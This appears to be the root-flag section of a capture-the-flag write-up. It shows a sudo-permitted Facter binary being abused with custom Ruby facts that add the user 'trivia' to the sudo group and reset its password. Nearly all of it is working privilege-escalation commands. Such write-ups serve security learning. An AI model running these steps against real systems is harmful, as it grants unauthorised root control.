Root flag

Notice the sudo rights:

sudo -l
(ALL) NOPASSWD: /usr/bin/facter

We can execute commands using this tool by creating ruby “facts”:

  1. add user to sudo group
    echo "# hardware_platform.rb

Facter.add('hardware_platform') do
  setcode do
    Facter::Core::Execution.execute('usermod -aG sudo trivia')
  end
end" > test.rb
    sudo /usr/bin/facter --custom-dir /home/trivia
  2. update trivia password
    echo "# hardware_platform.rb

Facter.add('hardware_platform') do
  setcode do
    Facter::Core::Execution.execute('echo "trivia:trivia" | sudo chpasswd')
  end
end" > test.rb
    sudo /usr/bin/facter --custom-dir /home/trivia
